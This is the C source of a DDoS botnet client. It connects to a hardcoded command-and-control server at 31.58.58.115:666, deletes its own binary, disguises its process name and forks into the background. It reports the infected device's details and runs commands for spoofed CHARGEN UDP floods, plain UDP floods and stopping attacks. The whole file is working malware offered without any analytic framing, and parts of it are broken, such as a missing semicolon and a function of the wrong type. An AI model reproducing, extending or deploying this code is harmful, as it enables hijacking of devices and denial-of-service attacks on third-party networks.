#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define PROTO_GRE 47
#define GRE_PROTO_IP 0x0800
#define PROTO_UDPLITE 136

#define STD_PIGZ 50
#define PHI 0x9e3779b9 
#define UDP_HDRLEN 8
#define IP_MAXPACKET 65535
#define UID_PATH "/etc/.uid"
#define XOR_KEY "demonkey"
#define IP4_HDRLEN 20
#define ICMP_HDRLEN 8
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>   // for struct iphdr
#include <arpa/inet.h>     // for inet_addr, htons

#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>

#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>

#define std_packets 1460
#define BUFFER_SIZE 1024
#define SERVER_LIST_SIZE (sizeof(ServerInfo) / sizeof(unsigned char *))
char *getBuild() { // More Archs Added 9.0
	#if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
	#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
	return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
	#elif defined(__arc__)
	return "Arc";
    #else
    return "Unknown";
    #endif
}
char *getBuildz() // Updated as of 8.0
{
if(access("/usr/bin/python", F_OK) != -1){
	return "Python Device";
	}
	if(access("/usr/bin/perl", F_OK) != -1){
	return "Perl Device";
	}
	if(access("/usr/sbin/telnetd", F_OK) != -1){
	return "Telnet Device";
	} else {
	return "Unknown";
	}
}



#define Server_Botport 666
unsigned char *ServerInfo[] = {"31.58.58.115:666"};
int getBogos(unsigned char *bogomips);
int botnetServer = -1;
uint32_t *pids;
uint32_t botnetPid;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {0};
char *inet_ntoa(struct in_addr in);
int KadenCommStock = 0;
int botnetPrint(int sock, char *formatStr, ...);
static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
static uint32_t x, y, z, w;
void rand_init(void) {
	x = time(NULL);
	y = getpid() ^ getppid();
	z = clock();
	w = z ^ y;
}
uint32_t rand_next(void) {
	uint32_t t = x;
	t ^= t << 11;
	t ^= t >> 8;
	x = y; y = z; z = w;
	w ^= w >> 19;
	w ^= t;
	return w;
}
void rand_str(char *str, int len) {
	while (len > 0) {
		if (len >= 4) {
			*((uint32_t *)str) = rand_next();
			str += sizeof (uint32_t);
			len -= sizeof (uint32_t);
		}
		else if (len >= 2) {
			*((uint16_t *)str) = rand_next() & 0xFFFF;
			str += sizeof (uint16_t);
			len -= sizeof (uint16_t);
		} else {
			*str++ = rand_next() & 0xFF;
			len--;
		}
	}
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}

void rand_alphastr(uint8_t *str, int len) {
	const char alphaset[] = "zxry3gdqbbr6lzncrmpvqypeuaqzfrv";
	while (len > 0) {
		if (len >= sizeof (uint32_t)) {
			int i;
			uint32_t entropy = rand_next();
			for (i = 0; i < sizeof (uint32_t); i++) {
				uint8_t tmp = entropy & 0xff;
				entropy = entropy >> 8;
				tmp = tmp >> 3;
				*str++ = alphaset[tmp];
			}
			len -= sizeof (uint32_t);
		} else {
			*str++ = rand_next() % (sizeof (alphaset));
			len--;
		}
	}
}
int util_strlen(char *str) {
	int c = 0;
	while (*str++ != 0)
	c++;
	return c;
}
void util_memcpy(void *dst, void *src, int len) {
	char *r_dst = (char *)dst;
	char *r_src = (char *)src;
	while (len--)
	*r_dst++ = *r_src++;
}
int util_strcpy(char *dst, char *src) {
	int l = util_strlen(src);
	util_memcpy(dst, src, l + 1);
	return l;
}
static void printchar(unsigned char **str, int c) {
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int got = 1, total = 0;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got == 0 ? NULL : buffer;
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
	register int pc = 0, padchar = ' ';
	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		printchar (out, padchar);
		++pc;
	}
	return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;
	if (i == 0) {
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return prints (out, print_buf, width, pad);
	}
	if (sg && b == 10 && i < 0) {
		neg = 1;
		u = -i;
	}
	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';
	while (u) {
		t = u % b;
		if( t >= 10 )
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}
	if (neg) {
		if( width && (pad & PAD_ZERO) ) {
			printchar (out, '-');
			++pc;
			--width;
		} else {
			*--s = '-';
		}	
	}
	return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];
	for (; *format != 0; ++format) {
		if (*format == '%') {
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') {
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') {
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) {
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) {
				register char *s = (char *)va_arg( args, intptr_t );
				pc += prints (out, s?s:"(null)", width, pad);
				continue;
			}
			if( *format == 'd' ) {
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) {
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) {
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += prints (out, scr, width, pad);
				continue;
			}
		} else {
			out:
			printchar (out, *format);
			++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}
int szprintf(unsigned char *out, const unsigned char *format, ...) {
	va_list args;
	va_start( args, format );
	return print( &out, format, args );
}
int botnetPrint(int sock, char *formatStr, ...) {
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}
void trim(char *str) {
	int i;
	int begin = 0;
	int end = strlen(str) - 1;
	while (isspace(str[begin])) begin++;
	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];
	str[i - begin] = '\0';
}
int getHost(unsigned char *toGet, struct in_addr *i) {
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}
int recvLine(int socket, unsigned char *buf, int bufsize) {
	memset(buf, 0, bufsize);
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	FD_ZERO(&myset);
	FD_SET(socket, &myset);
	int selectRtn, retryCount;
	if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
		while(retryCount < 10) {
			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(socket, &myset);
			if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
				retryCount++;
				continue;
			}
			break;
		}
	}
	unsigned char tmpchr;
	unsigned char *cp;
	int count = 0;
	cp = buf;
	while(bufsize-- > 1) {
		if(recv(KadenCommStock, &tmpchr, 1, 0) != 1) {
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
		if(tmpchr == '\n') break;
		count++;
	}
	*cp = 0x00;
	return count;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
	struct sockaddr_in dest_addr;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	int valopt;
	long arg = fcntl(fd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(fd, F_SETFL, arg);
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(host, &dest_addr.sin_addr)) return 0;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
	if (res < 0) {
		if (errno == EINPROGRESS) {
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(fd, &myset);
			if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
				lon = sizeof(int);
				getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}
	arg = fcntl(fd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(fd, F_SETFL, arg);
	return 1;
}
int listFork() {
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}

in_addr_t GRIP(in_addr_t netmask) {
	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
	return tmp ^ ( rand_cmwc() & ~netmask);
}
int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
	return 0;
	return sock;
}

void makeRandomStr(unsigned char *buf, int length) {
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
unsigned short csum (unsigned short *buf, int count) {
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
	struct tcp_pseudo {
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}
#ifndef __UDPHDR_DEFINED
#define __UDPHDR_DEFINED

struct udphdr {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

#endif
int getBogos(unsigned char *bogomips)
{
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf)
                {
                        unsigned char *pos = linebuf + 8;
                        while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
                        while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
                        if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
                        strcpy(bogomips, pos);
                        close(cmdline);
                        return 0;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return 1;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}
int sclose(int fd) {
	if(3 > fd) return 1;
	close(fd);
	return 0;
}

void makeSystemUID(unsigned char *uid, int size) {
    unsigned char bogomips[16];
    memset(bogomips, 0, sizeof(bogomips));
    getBogos(bogomips);  // From /proc/cpuinfo
    snprintf((char *)uid, size, "%s-%s", inet_ntoa(ourIP), bogomips);
}



void sendCHARGEN(unsigned char *target, int duration, int spoofit, int packetsize) {
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(19); // CHARGEN port
	if (getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, 0, sizeof(dest_addr.sin_zero));

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if (sockfd < 0) return;

	int tmp = 1;
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
		close(sockfd);
		return;
	}

	in_addr_t netmask = (spoofit == 0) ? ~((in_addr_t)0) : ~((1 << (32 - spoofit)) - 1);

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
	unsigned char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

	int end = time(NULL) + duration;
	while (time(NULL) < end) {
		makeRandomStr(data, packetsize);

		uint32_t src_ip = htonl(GRIP(netmask));
		uint16_t src_port = rand_cmwc() % 65535;

		// IP header
		iph->ihl = 5;
		iph->version = 4;
		iph->tos = 0;
		iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize);
		iph->id = htons(rand_cmwc() % 65535);
		iph->frag_off = 0;
		iph->ttl = MAXTTL;
		iph->protocol = IPPROTO_UDP;
		iph->saddr = src_ip;
		iph->daddr = dest_addr.sin_addr.s_addr;
		iph->check = 0;
		iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));

		// UDP header
		udph->source = htons(src_port);
		udph->dest = htons(19); // CHARGEN
		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->check = 0;

		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
	}

	close(sockfd);
}


void sendSTD(unsigned char *ip, int port, int secs) 
{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1)
	{
		char *hexstring[] = {"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"};
		if (a >= 50)
		{
			send(std_hex, hexstring, std_packets, 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}
void processCmd(int argc, unsigned char *argv[]) { 
	
	if (!strcmp(argv[0], "CHARGEN")) {
	if (argc < 5) return;

	unsigned char *ip = argv[1];
	int duration = atoi(argv[2]);
	int spoofit = atoi(argv[3]);
	int packetsize = atoi(argv[4]);

	if (strstr(ip, ",") != NULL) {
		unsigned char *hi = strtok(ip, ",");
		while (hi != NULL) {
			if (!listFork()) {
				sendCHARGEN(hi, duration, spoofit, packetsize);
				_exit(0);
			}
			hi = strtok(NULL, ",");
		}
	} else {
		if (!listFork()) {
			sendCHARGEN(ip, duration, spoofit, packetsize);
			_exit(0);
		}
	}
	return;
}

	
     
		if(!strcmp(argv[0], "STD"))
		{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					sendSTD(hi, port, time);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			sendSTD(ip, port, time);
			_exit(0);
		}
	}	
if(!strcmp(argv[0], "STOP")) {
		int killed = 0;
		unsigned long i;
		for (i = 0; i < numpids; i++) {
			if (pids[i] != 0 && pids[i] != getpid()) {
				kill(pids[i], 9);
				killed++;
			}
		}
	}
}
int getOurIP() {
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock == -1) return 0;
	struct sockaddr_in serv;
	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr("8.8.8.8");
	serv.sin_port = htons(53);
	int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
	if(err == -1) return 0;
	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*) &name, &namelen);
	if(err == -1) return 0;
	ourIP.s_addr = name.sin_addr.s_addr;
	int cmdline = open("/proc/net/route", O_RDONLY);
	char linebuf[4096];
	while(fdgets(linebuf, 4096, cmdline) != NULL) {
		if(strstr(linebuf, "\t00000000\t") != NULL) {
			unsigned char *pos = linebuf;
			while(*pos != '\t') pos++;
			*pos = 0;
			break;
		}
		memset(linebuf, 0, 4096);
	}
	close(cmdline);
	if(*linebuf) {
		int i;
		struct ifreq ifr;
		strcpy(ifr.ifr_name, linebuf);
		ioctl(sock, SIOCGIFHWADDR, &ifr);
		for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
	}
	close(sock);
}
int getEndianness(void)
{
	union
	{
		uint32_t vlu;
		uint8_t data[sizeof(uint32_t)];
	} nmb;
	nmb.data[0] = 0x00;
	nmb.data[1] = 0x01;
	nmb.data[2] = 0x02;
	nmb.data[3] = 0x03;
	switch (nmb.vlu)
	{
		case UINT32_C(0x00010203):
			return "BIG_ENDIAN";
		case UINT32_C(0x03020100):
			return "LITTLE_ENDIAN";
		case UINT32_C(0x02030001):
			return "BIG_ENDIAN_W";
		case UINT32_C(0x01000302):
			return "LITTLE_ENDIAN_W";
		default:
			return "UNKNOWN";
	}
}
int initConnection() {
	unsigned char server[4096];
	memset(server, 0, 4096);
	if(KadenCommStock) { close(KadenCommStock); KadenCommStock = 0; } 
	if(botnetServer + 1 == SERVER_LIST_SIZE) botnetServer = 0;
	else botnetServer++;
	strcpy(server, ServerInfo[botnetServer]);
	int port = Server_Botport;
	if(strchr(server, ':') != NULL) {
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}
	KadenCommStock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(KadenCommStock, server, port, 30)) return 1;
	return 0;
}
int main(int argc, unsigned char *argv[]) {
	char name_buf[32];
	char id_buf[32];
	int name_buf_len;
	if(SERVER_LIST_SIZE <= 0) return 0; 
	unlink(argv[0]);
	rand_init();
	name_buf_len = ((rand_next() % 4) + 3) * 4;
	rand_alphastr(name_buf, name_buf_len);
	name_buf[name_buf_len] = 0;
	util_strcpy(argv[0], name_buf);
	name_buf_len = ((rand_next() % 6) + 3) * 4;
	rand_alphastr(name_buf, name_buf_len);
	name_buf[name_buf_len] = 0;
	prctl(PR_SET_NAME, name_buf);
	srand(time(NULL) ^ getpid());
	rand_init();
	pid_t pid1;
	pid_t pid2;
	int status;
	getOurIP();
	if (pid1 = fork()) {
		waitpid(pid1, &status, 0);
		exit(0);
	} else if (!pid1) {
		if (pid2 = fork()) {
			exit(0);
		} else if (!pid2) {
		} else {
		}
	} else {
	} 
	chdir("/");
	signal(SIGPIPE, SIG_IGN);
	while(1) {
		if(initConnection()) { continue; }
		botnetPrint(KadenCommStock, "\e[0;97m[ \e[0;91mExecution \e[0;97m] [ \e[0;91m%s\e[0;97m ] Connected -> \e[0;91m%s\e[0;97m  | Endian \e[0;91m%s  \e[0;97m| Device: \e[0;91m%s", getBuild(), inet_ntoa(ourIP), getEndianness(), getBuildz());
		unsigned char uid[64];
              makeSystemUID(uid, sizeof(uid));
              botnetPrint(KadenCommStock, "\x1b[33m UID %s", uid);

		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(KadenCommStock, commBuf, 4096)) != -1) {
			for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
				unsigned int *newpids, on;
				for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
				pids[on - 1] = 0;
				numpids--;
				newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
				for (on = 0; on < numpids; on++) newpids[on] = pids[on];
				free(pids);
				pids = newpids;
			}
			commBuf[got] = 0x00;
			trim(commBuf);
			unsigned char *message = commBuf;
			if(*message == '!') {
				unsigned char *nickMask = message + 1;
				while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
				if(*nickMask == 0x00) continue;
				*(nickMask) = 0x00;
				nickMask = message + 1;
				message = message + strlen(nickMask) + 2;
				while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;
				unsigned char *command = message;
				while(*message != ' ' && *message != 0x00) message++;
				*message = 0x00;
				message++;
				unsigned char *tmpcommand = command;
				while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }
				unsigned char *params[10];
				int paramsCount = 1;
				unsigned char *pch = strtok(message, " ");
				params[0] = command;
				while(pch) {
					if(*pch != '\n') {
						params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
						memset(params[paramsCount], 0, strlen(pch) + 1);
						strcpy(params[paramsCount], pch);
						paramsCount++;
					}
					pch = strtok(NULL, " ");
				}
				processCmd(paramsCount, params);
				if(paramsCount > 1) {
					int q = 1;
					for(q = 1; q < paramsCount; q++) {
						free(params[q]);
					}
				}
			}
		}
	}
	return 0;
}
